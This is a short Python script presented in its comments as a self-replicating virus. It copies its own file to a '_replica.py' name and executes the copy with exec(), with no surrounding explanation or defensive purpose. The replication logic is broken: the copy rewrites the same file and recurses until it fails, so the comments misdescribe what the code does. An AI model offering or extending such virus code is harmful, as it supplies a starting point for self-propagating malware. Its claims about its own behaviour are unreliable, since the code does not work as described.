import shutil
import sys

def replicate():
    # Retrieve the path of this script
    script_path = sys.argv[0]
    
    # Generate a new file name for the replicated virus
    replicated_virus = script_path.replace('.py', '_replica.py')
    
    # Copy the virus code to the replicated file
    shutil.copyfile(script_path, replicated_virus)
    
    # Execute the replicated virus
    exec(open(replicated_virus).read())

# Replicate the virus
replicate()
